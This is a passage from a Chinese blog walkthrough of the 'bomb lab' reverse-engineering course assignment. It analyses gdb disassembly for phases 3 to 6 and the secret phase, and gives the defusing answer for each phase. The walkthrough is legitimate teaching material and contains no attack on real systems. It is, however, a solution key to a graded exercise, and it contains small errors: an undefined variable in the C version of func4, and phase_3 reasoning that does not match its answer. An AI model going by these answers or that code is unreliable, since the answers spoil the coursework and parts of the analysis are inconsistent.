bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0000000000400ef1 &lt;+14&gt;:mov    <span class="hljs-variable">$0x4027cd</span>,%esi<br>0x0000000000400ef6 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>0x0000000000400efb &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;<br>0x0000000000400f00 &lt;+29&gt;:cmp    <span class="hljs-variable">$0x1</span>,%eax<br></code></pre></td></tr></table></figure><p>查看0x4027cd,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/s 0x4027cd<br>0x4027cd: <span class="hljs-string">"%d %d"</span><br></code></pre></td></tr></table></figure></p><p>可知,应该是读入了两个整数.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">   0x0000000000400f15 &lt;+50&gt;:jmpq   *0x402500(,%rax,8)<br>   0x0000000000400f1c &lt;+57&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f21 &lt;+62&gt;:jmp    0x400f28 &lt;phase_3+69&gt;<br>   0x0000000000400f23 &lt;+64&gt;:mov    <span class="hljs-variable">$0x19c</span>,%eax<br>   0x0000000000400f28 &lt;+69&gt;:sub    <span class="hljs-variable">$0xcd</span>,%eax<br>   0x0000000000400f2d &lt;+74&gt;:jmp    0x400f34 &lt;phase_3+81&gt;<br>   0x0000000000400f2f &lt;+76&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f34 &lt;+81&gt;:add    <span class="hljs-variable">$0x29b</span>,%eax<br>   0x0000000000400f39 &lt;+86&gt;:jmp    0x400f40 &lt;phase_3+93&gt;<br>   0x0000000000400f3b &lt;+88&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>   0x0000000000400f40 &lt;+93&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax<br>   0x0000000000400f45 &lt;+98&gt;:jmp    0x400f4c &lt;phase_3+105&gt;<br>   0x0000000000400f47 &lt;+100&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f4c &lt;+105&gt;:add    <span class="hljs-variable">$0x36f</span>,%eax<br>   0x0000000000400f51 &lt;+110&gt;:jmp    0x400f58 &lt;phase_3+117&gt;<br>   0x0000000000400f53 &lt;+112&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f58 &lt;+117&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax<br>   0x0000000000400f5d &lt;+122&gt;:jmp    0x400f64 &lt;phase_3+129&gt;<br>   0x0000000000400f5f &lt;+124&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f64 &lt;+129&gt;:add    <span class="hljs-variable">$0x36f</span>,%eax<br>   0x0000000000400f69 &lt;+134&gt;:jmp    0x400f70 &lt;phase_3+141&gt;<br>   0x0000000000400f6b &lt;+136&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f70 &lt;+141&gt;:sub    <span class="hljs-variable">$0x36f</span>,%eax<br>   0x0000000000400f75 &lt;+146&gt;:jmp    0x400f81 &lt;phase_3+158&gt;<br>   0x0000000000400f77 &lt;+148&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000400f7c &lt;+153&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400f81 &lt;+158&gt;:cmpl   <span class="hljs-variable">$0x5</span>,0xc(%rsp)<br>   0x0000000000400f86 &lt;+163&gt;:jg     0x400f8e &lt;phase_3+171&gt;<br>   0x0000000000400f88 &lt;+165&gt;:cmp    0x8(%rsp),%eax<br>   0x0000000000400f8c &lt;+169&gt;:je     0x400f93 &lt;phase_3+176&gt;<br>   0x0000000000400f8e &lt;+171&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br></code></pre></td></tr></table></figure></p><p>由这段汇编代码可知,这是一段switch语句,使用输入的第一个值作为key,<br>经过对应跳转位置的操作后应与第二个数相等.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p/x *（0x402500 + 32）<br><span class="hljs-variable">$1</span> = 0x400f47<br></code></pre></td></tr></table></figure></p><p>那么第一个数为0时,跳转到0x400f23处,那么第二个数应该为此处的0x0,<br>故一组答案为4 0;</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas phase_4<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_4:<br>   0x0000000000400fd0 &lt;+0&gt;:sub    <span class="hljs-variable">$0x18</span>,%rsp<br>   0x0000000000400fd4 &lt;+4&gt;:lea    0xc(%rsp),%rcx<br>   0x0000000000400fd9 &lt;+9&gt;:lea    0x8(%rsp),%rdx<br>   0x0000000000400fde &lt;+14&gt;:mov    <span class="hljs-variable">$0x4027cd</span>,%esi<br>   0x0000000000400fe3 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400fe8 &lt;+24&gt;:callq  0x400ba0 &lt;__isoc99_sscanf@plt&gt;<br>   0x0000000000400fed &lt;+29&gt;:cmp    <span class="hljs-variable">$0x2</span>,%eax<br>   0x0000000000400ff0 &lt;+32&gt;:jne    0x400ffe &lt;phase_4+46&gt;<br>   0x0000000000400ff2 &lt;+34&gt;:mov    0xc(%rsp),%eax<br>   0x0000000000400ff6 &lt;+38&gt;:sub    <span class="hljs-variable">$0x2</span>,%eax<br>   0x0000000000400ff9 &lt;+41&gt;:cmp    <span class="hljs-variable">$0x2</span>,%eax<br>   0x0000000000400ffc &lt;+44&gt;:jbe    0x401003 &lt;phase_4+51&gt;<br>   0x0000000000400ffe &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000401003 &lt;+51&gt;:mov    0xc(%rsp),%esi<br>   0x0000000000401007 &lt;+55&gt;:mov    <span class="hljs-variable">$0x9</span>,%edi<br>   0x000000000040100c &lt;+60&gt;:callq  0x400f98 &lt;func4&gt;<br>   0x0000000000401011 &lt;+65&gt;:cmp    0x8(%rsp),%eax<br>   0x0000000000401015 &lt;+69&gt;:je     0x40101c &lt;phase_4+76&gt;<br>   0x0000000000401017 &lt;+71&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x000000000040101c &lt;+76&gt;:add    <span class="hljs-variable">$0x18</span>,%rsp<br>   0x0000000000401020 &lt;+80&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>由代码易知,phase_4读入了两个数,第二个数在2-4之间,然后将第二个数作为<br>func4的第二个参数,func4第一个参数为9,输入的第一个数必须和func4返回值相等.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas func4 <br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> func4:<br>   0x0000000000400f98 &lt;+0&gt;:push   %r12<br>   0x0000000000400f9a &lt;+2&gt;:push   %rbp<br>   0x0000000000400f9b &lt;+3&gt;:push   %rbx<br>   0x0000000000400f9c &lt;+4&gt;:mov    %edi,%ebx<br>   0x0000000000400f9e &lt;+6&gt;:<span class="hljs-built_in">test</span>   %edi,%edi<br>   0x0000000000400fa0 &lt;+8&gt;:jle    0x400fc6 &lt;func4+46&gt;<br>   0x0000000000400fa2 &lt;+10&gt;:mov    %esi,%ebp<br>   0x0000000000400fa4 &lt;+12&gt;:mov    %esi,%eax<br>   0x0000000000400fa6 &lt;+14&gt;:cmp    <span class="hljs-variable">$0x1</span>,%edi<br>   0x0000000000400fa9 &lt;+17&gt;:je     0x400fcb &lt;func4+51&gt;<br>   0x0000000000400fab &lt;+19&gt;:lea    -0x1(%rdi),%edi<br>   0x0000000000400fae &lt;+22&gt;:callq  0x400f98 &lt;func4&gt;<br>   0x0000000000400fb3 &lt;+27&gt;:lea    (%rax,%rbp,1),%r12d<br>   0x0000000000400fb7 &lt;+31&gt;:lea    -0x2(%rbx),%edi<br>   0x0000000000400fba &lt;+34&gt;:mov    %ebp,%esi<br>   0x0000000000400fbc &lt;+36&gt;:callq  0x400f98 &lt;func4&gt;<br>   0x0000000000400fc1 &lt;+41&gt;:add    %r12d,%eax<br>   0x0000000000400fc4 &lt;+44&gt;:jmp    0x400fcb &lt;func4+51&gt;<br>   0x0000000000400fc6 &lt;+46&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000400fcb &lt;+51&gt;:pop    %rbx<br>   0x0000000000400fcc &lt;+52&gt;:pop    %rbp<br>   0x0000000000400fcd &lt;+53&gt;:pop    %r12<br>   0x0000000000400fcf &lt;+55&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure></p><p>此函数等价于下面的c代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span><br></span>&#123;<br>    <span class="hljs-keyword">if</span>(a &lt;= <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(a == <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> b;<br>    <span class="hljs-keyword">return</span> b + func4(a - <span class="hljs-number">1</span>, b) + func4(n - <span class="hljs-number">2</span>, b);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>穷举2-4的值即可得到答案,取答案为176 2</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas phase_5<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_5:<br>   0x0000000000401021 &lt;+0&gt;:push   %rbx<br>   0x0000000000401022 &lt;+1&gt;:mov    %rdi,%rbx<br>   0x0000000000401025 &lt;+4&gt;:callq  0x401261 &lt;string_length&gt;<br>   0x000000000040102a &lt;+9&gt;:cmp    <span class="hljs-variable">$0x6</span>,%eax<br>   0x000000000040102d &lt;+12&gt;:je     0x401034 &lt;phase_5+19&gt;<br>   0x000000000040102f &lt;+14&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000401034 &lt;+19&gt;:mov    <span class="hljs-variable">$0x0</span>,%eax<br>   0x0000000000401039 &lt;+24&gt;:mov    <span class="hljs-variable">$0x0</span>,%edx<br>   0x000000000040103e &lt;+29&gt;:movzbl (%rbx,%rax,1),%ecx<br>   0x0000000000401042 &lt;+33&gt;:and    <span class="hljs-variable">$0xf</span>,%ecx<br>   0x0000000000401045 &lt;+36&gt;:add    0x402540(,%rcx,4),%edx<br>   0x000000000040104c &lt;+43&gt;:add    <span class="hljs-variable">$0x1</span>,%rax<br>   0x0000000000401050 &lt;+47&gt;:cmp    <span class="hljs-variable">$0x6</span>,%rax<br>   0x0000000000401054 &lt;+51&gt;:jne    0x40103e &lt;phase_5+29&gt;<br>   0x0000000000401056 &lt;+53&gt;:cmp    <span class="hljs-variable">$0x27</span>,%edx<br>   0x0000000000401059 &lt;+56&gt;:je     0x401060 &lt;phase_5+63&gt;<br>   0x000000000040105b &lt;+58&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000401060 &lt;+63&gt;:pop    %rbx<br>   0x0000000000401061 &lt;+64&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>由汇编代码可知,需要输入一个长度为6的字符串.令该字符串为input,+36处出现的<br>数组为array,则该汇编等价于下面代码.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    sum += <span class="hljs-built_in">array</span>[ input[i] &amp; <span class="hljs-number">0xf</span> ];<br></code></pre></td></tr></table></figure></p><p>意为遍历输入字符串,取该字符串低4位作为array下标,取出array值相加.<br>查看array的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p/x *0x402540@16<br><span class="hljs-variable">$2</span> = &#123;0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, <br>  0xf, 0xd&#125;<br></code></pre></td></tr></table></figure></p><p>题目要求sum = 0x27,故从array中选出6个和为0x27的数,通过这6个数的下标找出对应字符.<br>答案应为01347L;</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>因为课程未对后续两关作要求,故不做特别详细的解答.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas phase_6<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_6:<br>   0x0000000000401062 &lt;+0&gt;:push   %r13<br>   0x0000000000401064 &lt;+2&gt;:push   %r12<br>   0x0000000000401066 &lt;+4&gt;:push   %rbp<br>   0x0000000000401067 &lt;+5&gt;:push   %rbx<br>   0x0000000000401068 &lt;+6&gt;:sub    <span class="hljs-variable">$0x58</span>,%rsp<br>   0x000000000040106c &lt;+10&gt;:lea    0x30(%rsp),%rsi<br>   0x0000000000401071 &lt;+15&gt;:callq  0x40151a &lt;read_six_numbers&gt;<br>   0x0000000000401076 &lt;+20&gt;:lea    0x30(%rsp),%r13<br>   0x000000000040107b &lt;+25&gt;:mov    <span class="hljs-variable">$0x0</span>,%r12d<br>   0x0000000000401081 &lt;+31&gt;:mov    %r13,%rbp<br>   0x0000000000401084 &lt;+34&gt;:mov    0x0(%r13),%eax<br>   0x0000000000401088 &lt;+38&gt;:sub    <span class="hljs-variable">$0x1</span>,%eax<br>   0x000000000040108b &lt;+41&gt;:cmp    <span class="hljs-variable">$0x5</span>,%eax<br>   0x000000000040108e &lt;+44&gt;:jbe    0x401095 &lt;phase_6+51&gt;<br>   0x0000000000401090 &lt;+46&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000401095 &lt;+51&gt;:add    <span class="hljs-variable">$0x1</span>,%r12d<br>   0x0000000000401099 &lt;+55&gt;:cmp    <span class="hljs-variable">$0x6</span>,%r12d<br>   0x000000000040109d &lt;+59&gt;:jne    0x4010a6 &lt;phase_6+68&gt;<br>   0x000000000040109f &lt;+61&gt;:mov    <span class="hljs-variable">$0x0</span>,%esi<br>   0x00000000004010a4 &lt;+66&gt;:jmp    0x4010e8 &lt;phase_6+134&gt;<br>   0x00000000004010a6 &lt;+68&gt;:mov    %r12d,%ebx<br>   0x00000000004010a9 &lt;+71&gt;:movslq %ebx,%rax<br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>   0x00000000004010ac &lt;+74&gt;:mov    0x30(%rsp,%rax,4),%eax<br>   0x00000000004010b0 &lt;+78&gt;:cmp    %eax,0x0(%rbp)<br>   0x00000000004010b3 &lt;+81&gt;:jne    0x4010ba &lt;phase_6+88&gt;<br>   0x00000000004010b5 &lt;+83&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x00000000004010ba &lt;+88&gt;:add    <span class="hljs-variable">$0x1</span>,%ebx<br>   0x00000000004010bd &lt;+91&gt;:cmp    <span class="hljs-variable">$0x5</span>,%ebx<br>   0x00000000004010c0 &lt;+94&gt;:jle    0x4010a9 &lt;phase_6+71&gt;<br>   0x00000000004010c2 &lt;+96&gt;:add    <span class="hljs-variable">$0x4</span>,%r13<br>   0x00000000004010c6 &lt;+100&gt;:jmp    0x401081 &lt;phase_6+31&gt;<br>   0x00000000004010c8 &lt;+102&gt;:mov    0x8(%rdx),%rdx<br>   0x00000000004010cc &lt;+106&gt;:add    <span class="hljs-variable">$0x1</span>,%eax<br>   0x00000000004010cf &lt;+109&gt;:cmp    %ecx,%eax<br>   0x00000000004010d1 &lt;+111&gt;:jne    0x4010c8 &lt;phase_6+102&gt;<br>   0x00000000004010d3 &lt;+113&gt;:jmp    0x4010da &lt;phase_6+120&gt;<br>   0x00000000004010d5 &lt;+115&gt;:mov    <span class="hljs-variable">$0x603410</span>,%edx<br>   0x00000000004010da &lt;+120&gt;:mov    %rdx,(%rsp,%rsi,2)<br>   0x00000000004010de &lt;+124&gt;:add    <span class="hljs-variable">$0x4</span>,%rsi<br>   0x00000000004010e2 &lt;+128&gt;:cmp    <span class="hljs-variable">$0x18</span>,%rsi<br>   0x00000000004010e6 &lt;+132&gt;:je     0x4010fd &lt;phase_6+155&gt;<br>   0x00000000004010e8 &lt;+134&gt;:mov    0x30(%rsp,%rsi,1),%ecx<br>   0x00000000004010ec &lt;+138&gt;:cmp    <span class="hljs-variable">$0x1</span>,%ecx<br>   0x00000000004010ef &lt;+141&gt;:jle    0x4010d5 &lt;phase_6+115&gt;<br>   0x00000000004010f1 &lt;+143&gt;:mov    <span class="hljs-variable">$0x1</span>,%eax<br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>   0x00000000004010f6 &lt;+148&gt;:mov    <span class="hljs-variable">$0x603410</span>,%edx<br>   0x00000000004010fb &lt;+153&gt;:jmp    0x4010c8 &lt;phase_6+102&gt;<br>   0x00000000004010fd &lt;+155&gt;:mov    (%rsp),%rbx<br>   0x0000000000401101 &lt;+159&gt;:lea    0x8(%rsp),%rax<br>   0x0000000000401106 &lt;+164&gt;:lea    0x30(%rsp),%rsi<br>   0x000000000040110b &lt;+169&gt;:mov    %rbx,%rcx<br>   0x000000000040110e &lt;+172&gt;:mov    (%rax),%rdx<br>   0x0000000000401111 &lt;+175&gt;:mov    %rdx,0x8(%rcx)<br>   0x0000000000401115 &lt;+179&gt;:add    <span class="hljs-variable">$0x8</span>,%rax<br>   0x0000000000401119 &lt;+183&gt;:cmp    %rsi,%rax<br>   0x000000000040111c &lt;+186&gt;:je     0x401123 &lt;phase_6+193&gt;<br>   0x000000000040111e &lt;+188&gt;:mov    %rdx,%rcx<br>   0x0000000000401121 &lt;+191&gt;:jmp    0x40110e &lt;phase_6+172&gt;<br>   0x0000000000401123 &lt;+193&gt;:movq   <span class="hljs-variable">$0x0</span>,0x8(%rdx)<br>   0x000000000040112b &lt;+201&gt;:mov    <span class="hljs-variable">$0x5</span>,%ebp<br>   0x0000000000401130 &lt;+206&gt;:mov    0x8(%rbx),%rax<br>   0x0000000000401134 &lt;+210&gt;:mov    (%rax),%eax<br>   0x0000000000401136 &lt;+212&gt;:cmp    %eax,(%rbx)<br>   0x0000000000401138 &lt;+214&gt;:jge    0x40113f &lt;phase_6+221&gt;<br>   0x000000000040113a &lt;+216&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x000000000040113f &lt;+221&gt;:mov    0x8(%rbx),%rbx<br>   0x0000000000401143 &lt;+225&gt;:sub    <span class="hljs-variable">$0x1</span>,%ebp<br>   0x0000000000401146 &lt;+228&gt;:jne    0x401130 &lt;phase_6+206&gt;<br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>   0x0000000000401148 &lt;+230&gt;:add    <span class="hljs-variable">$0x58</span>,%rsp<br>   0x000000000040114c &lt;+234&gt;:pop    %rbx<br>   0x000000000040114d &lt;+235&gt;:pop    %rbp<br>   0x000000000040114e &lt;+236&gt;:pop    %r12<br>   0x0000000000401150 &lt;+238&gt;:pop    %r13<br>   0x0000000000401152 &lt;+240&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure></p><p>汇编代码很长.其意为输入6个互不相等的数,介于1-6.按这6个数的值从位于地址0x603410的链表中选出对应位置的<br>节点指针,组成一个数组.按选出的顺序将这六个节点组成新的链表,然后检查这个链表是否为降序.<br>查看链表的值.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) p/x *(0x603410)<br><span class="hljs-variable">$3</span> = 0x1cf<br>(gdb) p/x *(0x603410 + 8)<br><span class="hljs-variable">$4</span> = 0x603420<br>(gdb) p/x *(0x603420)<br><span class="hljs-variable">$5</span> = 0x188<br>(gdb) p/x *(0x603420 + 8)<br><span class="hljs-variable">$6</span> = 0x603430<br>(gdb) p/x *(0x603430)<br><span class="hljs-variable">$7</span> = 0x1d1<br>(gdb) p/x *(0x603430 + 8)<br><span class="hljs-variable">$8</span> = 0x603440<br>(gdb) p/x *(0x603440)<br><span class="hljs-variable">$9</span> = 0x174<br>(gdb) p/x *(0x603440 + 8)<br><span class="hljs-variable">$10</span> = 0x603450<br>(gdb) p/x *(0x603450)<br><span class="hljs-variable">$11</span> = 0x220<br>(gdb) p/x *(0x603450 + 8)<br><span class="hljs-variable">$12</span> = 0x603460<br>(gdb) p/x *(0x603460 + 8)<br><span class="hljs-variable">$13</span> = 0x0<br></code></pre></td></tr></table></figure></p><p>故答案应为6 5 3 1 2 4;  </p><h3 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h3><p>正常通过前6关是无法触发secret_phase的,查看汇编发现,在phase_4答案之后输入DrEvil即可进入secret_phase.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas secret_phase <br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> secret_phase:<br>   0x0000000000401191 &lt;+0&gt;:push   %rbx<br>   0x0000000000401192 &lt;+1&gt;:callq  0x40155c &lt;read_line&gt;<br>   0x0000000000401197 &lt;+6&gt;:mov    <span class="hljs-variable">$0xa</span>,%edx<br>   0x000000000040119c &lt;+11&gt;:mov    <span class="hljs-variable">$0x0</span>,%esi<br>   0x00000000004011a1 &lt;+16&gt;:mov    %rax,%rdi<br>   0x00000000004011a4 &lt;+19&gt;:callq  0x400b80 &lt;strtol@plt&gt;<br>   0x00000000004011a9 &lt;+24&gt;:mov    %rax,%rbx<br>   0x00000000004011ac &lt;+27&gt;:lea    -0x1(%rax),%eax<br>   0x00000000004011af &lt;+30&gt;:cmp    <span class="hljs-variable">$0x3e8</span>,%eax<br>   0x00000000004011b4 &lt;+35&gt;:jbe    0x4011bb &lt;secret_phase+42&gt;<br>   0x00000000004011b6 &lt;+37&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x00000000004011bb &lt;+42&gt;:mov    %ebx,%esi<br>   0x00000000004011bd &lt;+44&gt;:mov    <span class="hljs-variable">$0x603230</span>,%edi<br>   0x00000000004011c2 &lt;+49&gt;:callq  0x401153 &lt;fun7&gt;<br>   0x00000000004011c7 &lt;+54&gt;:cmp    <span class="hljs-variable">$0x4</span>,%eax<br>   0x00000000004011ca &lt;+57&gt;:je     0x4011d1 &lt;secret_phase+64&gt;<br>   0x00000000004011cc &lt;+59&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x00000000004011d1 &lt;+64&gt;:mov    <span class="hljs-variable">$0x4024d0</span>,%edi<br>   0x00000000004011d6 &lt;+69&gt;:callq  0x400ac0 &lt;puts@plt&gt;<br>   0x00000000004011db &lt;+74&gt;:callq  0x401682 &lt;phase_defused&gt;<br>   0x00000000004011e0 &lt;+79&gt;:pop    %rbx<br>   0x00000000004011e1 &lt;+80&gt;:retq   <br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>End of assembler 